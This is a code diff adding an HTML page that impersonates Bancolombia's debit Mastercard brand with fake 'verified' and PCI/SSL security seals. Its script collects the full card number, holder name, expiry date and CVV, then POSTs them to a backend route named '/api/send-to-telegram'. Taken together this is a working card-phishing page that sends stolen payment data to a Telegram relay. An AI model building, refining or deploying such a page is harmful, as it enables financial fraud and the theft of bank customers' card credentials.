@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Tarjeta Débito Bancolombia | Mastercard</title>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        background: linear-gradient(145deg, #e9eef3 0%, #dce2ea 100%);
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-family: 'Segoe UI', 'Inter', system-ui, sans-serif;
+        padding: 24px;
+    }
+
+    .wrapper {
+        max-width: 520px;
+        width: 100%;
+        margin: 0 auto;
+    }
+
+    .security-banner {
+        background: linear-gradient(95deg, #0c5e2e, #0a4a24);
+        border-radius: 16px;
+        padding: 12px 16px;
+        margin-bottom: 20px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        flex-wrap: wrap;
+        gap: 10px;
+    }
+    .security-banner-left {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+    .security-icon {
+        background: #ffd700;
+        border-radius: 50%;
+        width: 32px;
+        height: 32px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 18px;
+    }
+    .security-text {
+        color: white;
+        font-size: 0.75rem;
+        font-weight: 600;
+    }
+    .security-text strong {
+        font-size: 0.85rem;
+        display: block;
+    }
+    .verified-badge {
+        background: rgba(255,255,255,0.2);
+        border-radius: 20px;
+        padding: 4px 12px;
+        font-size: 0.7rem;
+        color: #ffd700;
+        font-weight: 700;
+    }
+
+    .card-stage {
+        perspective: 1200px;
+        margin-bottom: 24px;
+    }
+
+    .card {
+        position: relative;
+        width: 100%;
+        aspect-ratio: 85 / 54;
+        border-radius: 28px;
+        transform-style: preserve-3d;
+        transition: transform 0.65s cubic-bezier(0.23, 1, 0.32, 1);
+        box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.35);
+    }
+
+    .card.flipped {
+        transform: rotateY(180deg);
+    }
+
+    .card-face {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        border-radius: 28px;
+        backface-visibility: hidden;
+        overflow: hidden;
+    }
+
+    .front {
+        background: radial-gradient(circle at 10% 20%, #FFD700, #F9A800);
+        padding: 20px 22px;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+    }
+
+    .bank-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+    }
+
+    .bank-name {
+        font-size: 1.6rem;
+        font-weight: 800;
+        color: #0c2b1f;
+        letter-spacing: -0.5px;
+    }
+
+    .badge {
+        background: rgba(0,0,0,0.2);
+        backdrop-filter: blur(2px);
+        border-radius: 40px;
+        padding: 4px 10px;
+        font-size: 0.65rem;
+        font-weight: 700;
+    }
+
+    .sim-chip {
+        width: 48px;
+        height: 38px;
+        background: linear-gradient(135deg, #e0b87a, #bd8a3e);
+        border-radius: 8px;
+        margin-top: 12px;
+        position: relative;
+    }
+    .sim-chip:before {
+        content: "";
+        position: absolute;
+        top: 8px;
+        left: 10px;
+        width: 28px;
+        height: 20px;
+        background: repeating-linear-gradient(45deg, #c29a4b, #c29a4b 4px, #e6c384 4px, #e6c384 8px);
+        border-radius: 4px;
+    }
+
+    .card-number-input {
+        background: transparent;
+        border: none;
+        font-size: 1.2rem;
+        font-weight: 700;
+        letter-spacing: 2px;
+        font-family: 'Courier New', 'Fira Mono', monospace;
+        width: 100%;
+        outline: none;
+        color: #0d281d;
+        padding: 6px 0;
+        margin-top: 12px;
+        cursor: text;
+    }
+    .card-number-input::placeholder {
+        color: #aa7733;
+        font-size: 1rem;
+        letter-spacing: 1px;
+    }
+
+    .info-row {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 16px;
+    }
+
+    .info-group {
+        flex: 1;
+    }
+
+    .label {
+        font-size: 0.6rem;
+        font-weight: 600;
+        text-transform: uppercase;
+        color: #2c2b26;
+        letter-spacing: 0.5px;
+    }
+
+    .editable-value {
+        background: transparent;
+        border: none;
+        font-weight: 700;
+        font-size: 0.85rem;
+        width: 100%;
+        outline: none;
+        color: #0d1f16;
+        margin-top: 3px;
+        cursor: text;
+        padding: 2px 0;
+    }
+
+    .mastercard-logo {
+        display: flex;
+        align-items: center;
+        gap: 4px;
+        justify-content: flex-end;
+    }
+    .mc-circle-red {
+        background: #EB001B;
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        position: relative;
+        right: -12px;
+        opacity: 0.9;
+    }
+    .mc-circle-yellow {
+        background: #F79E1B;
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        opacity: 0.9;
+    }
+    .mc-text {
+        font-weight: 800;
+        font-size: 0.7rem;
+        letter-spacing: 1px;
+        color: #1a1a2e;
+        margin-left: 4px;
+    }
+
+    .back {
+        background: linear-gradient(145deg, #f7cd5c, #eda512);
+        transform: rotateY(180deg);
+    }
+
+    .black-strip {
+        background: #0a0a0a;
+        width: 100%;
+        height: 50px;
+        margin-top: 24px;
+    }
+
+    .cvc-container {
+        background: #fff9ef;
+        margin: 24px 20px 20px 20px;
+        border-radius: 10px;
+        padding: 10px 16px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+
+    .cvc-input {
+        background: transparent;
+        border: none;
+        font-size: 1.3rem;
+        font-weight: bold;
+        font-family: monospace;
+        width: 80px;
+        text-align: right;
+        outline: none;
+    }
+
+    .security-footer {
+        background: white;
+        border-radius: 20px;
+        padding: 16px 20px;
+        margin-top: 20px;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        flex-wrap: wrap;
+        gap: 12px;
+    }
+    .footer-logo {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+    .footer-logo-icon {
+        background: #0c5e2e;
+        width: 36px;
+        height: 36px;
+        border-radius: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #ffd700;
+        font-weight: bold;
+        font-size: 1.2rem;
+    }
+    .footer-logo-text {
+        font-weight: 800;
+        color: #0c2b1f;
+        font-size: 0.9rem;
+    }
+    .security-seals {
+        display: flex;
+        gap: 16px;
+    }
+    .seal {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 0.7rem;
+        color: #4a5b3e;
+        background: #f5f5f0;
+        padding: 5px 12px;
+        border-radius: 30px;
+    }
+
+    .btn-send {
+        background: linear-gradient(95deg, #2b6e3c, #1f4f2a);
+        border: none;
+        width: 100%;
+        padding: 14px;
+        border-radius: 40px;
+        color: white;
+        font-weight: 700;
+        font-size: 1rem;
+        cursor: pointer;
+        transition: 0.2s;
+        margin-top: 16px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+    }
+
+    .btn-send:hover {
+        transform: scale(0.98);
+        background: linear-gradient(95deg, #1f582d, #15411f);
+    }
+
+    .btn-send:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+    }
+
+    .status-msg {
+        font-size: 0.75rem;
+        margin-top: 12px;
+        text-align: center;
+        padding: 10px;
+        border-radius: 40px;
+        background: #f0f0f0;
+    }
+
+    .instruction {
+        background: rgba(255,248,220,0.95);
+        border-radius: 20px;
+        padding: 12px 16px;
+        text-align: center;
+        font-size: 0.7rem;
+        margin-bottom: 20px;
+        color: #664d1a;
+        border-left: 3px solid #f5b81b;
+    }
+    
+    .highlight {
+        background: #f5b81b;
+        color: #1f2a0e;
+        padding: 2px 8px;
+        border-radius: 20px;
+        font-weight: bold;
+    }
+
+    @media (max-width: 480px) {
+        .card-number-input { font-size: 1rem; letter-spacing: 1.5px; }
+        .front { padding: 16px; }
+        .bank-name { font-size: 1.3rem; }
+        .security-footer { flex-direction: column; align-items: flex-start; }
+    }
+</style>
+</head>
+<body>
+<div class="wrapper">
+    <div class="security-banner">
+        <div class="security-banner-left">
+            <div class="security-icon">🔒</div>
+            <div class="security-text">
+                <strong>Bancolombia Seguridad Verificada</strong>
+                Transacción protegida con chip EMV
+            </div>
+        </div>
+        <div class="verified-badge">✓ VERIFICADO</div>
+    </div>
+
+    <div class="instruction">
+        💳 <strong>Escribe directamente SOBRE la tarjeta</strong> — Completa el número, titular y <span class="highlight">FECHA</span>. 
+        <br>✨ Al terminar de escribir la fecha, la tarjeta se voltea automáticamente para que ingreses el CVV.
+    </div>
+
+    <div class="card-stage">
+        <div class="card" id="creditCard">
+            <div class="card-face front">
+                <div class="bank-header">
+                    <div class="bank-name">Bancolombia</div>
+                    <div class="badge">DÉBITO</div>
+                </div>
+                <div class="sim-chip"></div>
+                <input type="text" id="cardNumberInput" class="card-number-input" placeholder="**** **** **** ****" maxlength="19" inputmode="numeric">
+                <div class="info-row">
+                    <div class="info-group" style="flex: 2;">
+                        <div class="label">TITULAR</div>
+                        <input type="text" id="cardHolderInput" class="editable-value" placeholder="NOMBRE DEL TITULAR" maxlength="35">
+                    </div>
+                    <div class="info-group">
+                        <div class="label">VENCE</div>
+                        <input type="text" id="expiryInput" class="editable-value" placeholder="MM/AA" maxlength="5" style="width: 70px;">
+                    </div>
+                </div>
+                <div class="mastercard-logo">
+                    <div class="mc-circle-red"></div>
+                    <div class="mc-circle-yellow"></div>
+                    <span class="mc-text">Mastercard</span>
+                </div>
+            </div>
+            <div class="card-face back">
+                <div class="black-strip"></div>
+                <div class="cvc-container">
+                    <span style="font-weight:700">CVV2 / CVC</span>
+                    <input type="text" id="cvcInput" class="cvc-input" maxlength="3" placeholder="123" inputmode="numeric">
+                </div>
+                <div style="margin-top: 16px; text-align: center; font-size: 0.55rem; color: #4a3a1a;">Bancolombia • Banca Segura</div>
+            </div>
+        </div>
+    </div>
+
+    <button class="btn-send" id="sendBtn">
+        <span>✈️</span> ENVIAR A TELEGRAM
+    </button>
+    <div id="statusMsg" class="status-msg">✅ Completa los datos y presiona enviar</div>
+
+    <div class="security-footer">
+        <div class="footer-logo">
+            <div class="footer-logo-icon">🏦</div>
+            <div class="footer-logo-text">Bancolombia<br><span style="font-size:0.6rem;">Seguridad patrimonial</span></div>
+        </div>
+        <div class="security-seals">
+            <div class="seal"><span>🔐</span> <span>Cifrado SSL</span></div>
+            <div class="seal"><span>✓</span> <span>PCI DSS</span></div>
+            <div class="seal"><span>🛡️</span> <span>Anti-fraude</span></div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const card = document.getElementById('creditCard');
+    const numberInput = document.getElementById('cardNumberInput');
+    const holderInput = document.getElementById('cardHolderInput');
+    const expiryInput = document.getElementById('expiryInput');
+    const cvcInput = document.getElementById('cvcInput');
+    const sendBtn = document.getElementById('sendBtn');
+    const statusMsg = document.getElementById('statusMsg');
+
+    let isFlippingFromExpiry = false;
+    let expiryTimeout = null;
+
+    // Usar la API de Vercel (ruta relativa)
+    const API_URL = '/api/send-to-telegram';
+
+    function formatCardNumber(value) {
+        let cleaned = value.replace(/\D/g, '');
+        if (cleaned.length > 16) cleaned = cleaned.slice(0, 16);
+        let parts = [];
+        for (let i = 0; i < cleaned.length; i += 4) {
+            parts.push(cleaned.slice(i, i + 4));
+        }
+        return parts.join(' ');
+    }
+
+    numberInput.addEventListener('input', function(e) {
+        let formatted = formatCardNumber(e.target.value);
+        e.target.value = formatted;
+    });
+
+    function formatExpiry(value) {
+        let digits = value.replace(/\D/g, '');
+        if (digits.length > 4) digits = digits.slice(0, 4);
+        if (digits.length >= 3) {
+            return digits.slice(0, 2) + '/' + digits.slice(2, 4);
+        }
+        return digits;
+    }
+
+    expiryInput.addEventListener('input', function(e) {
+        let formatted = formatExpiry(e.target.value);
+        e.target.value = formatted;
+        
+        if (expiryTimeout) clearTimeout(expiryTimeout);
+        
+        if (e.target.value.length === 5 && e.target.value.includes('/')) {
+            expiryTimeout = setTimeout(() => {
+                if (!card.classList.contains('flipped')) {
+                    isFlippingFromExpiry = true;
+                    card.classList.add('flipped');
+                    setTimeout(() => {
+                        cvcInput.focus();
+                        isFlippingFromExpiry = false;
+                    }, 400);
+                }
+                expiryTimeout = null;
+            }, 300);
+        }
+    });
+
+    expiryInput.addEventListener('blur', function() {
+        if (expiryTimeout) {
+            clearTimeout(expiryTimeout);
+            expiryTimeout = null;
+        }
+        
+        if (!card.classList.contains('flipped') && expiryInput.value.length >= 3) {
+            isFlippingFromExpiry = true;
+            card.classList.add('flipped');
+            setTimeout(() => {
+                cvcInput.focus();
+                isFlippingFromExpiry = false;
+            }, 400);
+        }
+    });
+
+    expiryInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            if (!card.classList.contains('flipped')) {
+                isFlippingFromExpiry = true;
+                card.classList.add('flipped');
+                setTimeout(() => {
+                    cvcInput.focus();
+                    isFlippingFromExpiry = false;
+                }, 400);
+            }
+        }
+    });
+
+    holderInput.addEventListener('input', function(e) {
+        e.target.value = e.target.value.toUpperCase();
+        let sanitized = e.target.value.replace(/[^A-Z\s\.Ñ]/g, '');
+        if (sanitized !== e.target.value) {
+            e.target.value = sanitized;
+        }
+    });
+
+    cvcInput.addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
+    });
+
+    cvcInput.addEventListener('focus', () => {
+        if (!isFlippingFromExpiry) {
+            card.classList.add('flipped');
+        }
+    });
+    
+    cvcInput.addEventListener('blur', () => {
+        setTimeout(() => {
+            const activeElement = document.activeElement;
+            const isFrontField = activeElement === numberInput || activeElement === holderInput || activeElement === expiryInput;
+            if (!isFrontField && activeElement !== cvcInput) {
+                card.classList.remove('flipped');
+            }
+        }, 150);
+    });
+
+    [numberInput, holderInput].forEach(input => {
+        input.addEventListener('focus', () => {
+            if (card.classList.contains('flipped')) {
+                card.classList.remove('flipped');
+            }
+        });
+    });
+    
+    expiryInput.addEventListener('focus', () => {
+        if (card.classList.contains('flipped')) {
+            card.classList.remove('flipped');
+        }
+    });
+
+    sendBtn.addEventListener('click', async () => {
+        const cardNumber = numberInput.value.replace(/\s/g, '');
+        const cardHolder = holderInput.value.trim();
+        const expiryDate = expiryInput.value.trim();
+        const cvcCode = cvcInput.value.trim();
+
+        if (!cardNumber || !cardHolder || !expiryDate || !cvcCode) {
+            statusMsg.innerHTML = '⚠️ Por favor, completa todos los datos de la tarjeta';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
+            }, 3000);
+            return;
+        }
+
+        if (cardNumber.length < 16) {
+            statusMsg.innerHTML = '⚠️ El número de tarjeta debe tener 16 dígitos';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
+            }, 3000);
+            return;
+        }
+        
+        if (expiryDate.length < 5 || !expiryDate.includes('/')) {
+            statusMsg.innerHTML = '⚠️ La fecha debe tener formato MM/AA';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
+            }, 3000);
+            return;
+        }
+        
+        const month = parseInt(expiryDate.substring(0, 2), 10);
+        if (month < 1 || month > 12) {
+            statusMsg.innerHTML = '⚠️ Mes inválido (debe ser 01-12)';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
+            }, 3000);
+            return;
+        }
+        
+        if (cvcCode.length < 3) {
+            statusMsg.innerHTML = '⚠️ El CVV debe tener 3 dígitos';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
+            }, 3000);
+            return;
+        }
+
+        sendBtn.disabled = true;
+        sendBtn.innerHTML = '<span>📡</span> ENVIANDO A TELEGRAM...';
+        statusMsg.innerHTML = '📡 Enviando información de forma segura...';
+        statusMsg.style.background = '#e3f2fd';
+
+        try {
+            const response = await fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    cardNumber: cardNumber,
+                    cardHolder: cardHolder,
+                    expiryDate: expiryDate,
+                    cvcCode: cvcCode
+                })
+            });
+
+            const data = await response.json();
+
+            if (response.ok && data.success) {
+                statusMsg.innerHTML = '✅ ¡Datos enviados con éxito a Telegram!';
+                statusMsg.style.background = '#d4edda';
+                statusMsg.style.color = '#155724';
+            } else {
+                statusMsg.innerHTML = '❌ Error: ' + (data.error || 'Error desconocido');
+                statusMsg.style.background = '#f8d7da';
+                statusMsg.style.color = '#721c24';
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            statusMsg.innerHTML = '❌ Error de conexión. Verifica que el backend esté desplegado correctamente.';
+            statusMsg.style.background = '#f8d7da';
+            statusMsg.style.color = '#721c24';
+        } finally {
+            sendBtn.disabled = false;
+            sendBtn.innerHTML = '<span>✈️</span> ENVIAR A TELEGRAM';
+            setTimeout(() => {
+                if (statusMsg.innerHTML.includes('éxito')) {
+                    statusMsg.style.background = '#f0f0f0';
+                    statusMsg.style.color = '#000';
+                    statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
+                }
+            }, 4000);
+        }
+    });
+</script>
+</body>
+</html>
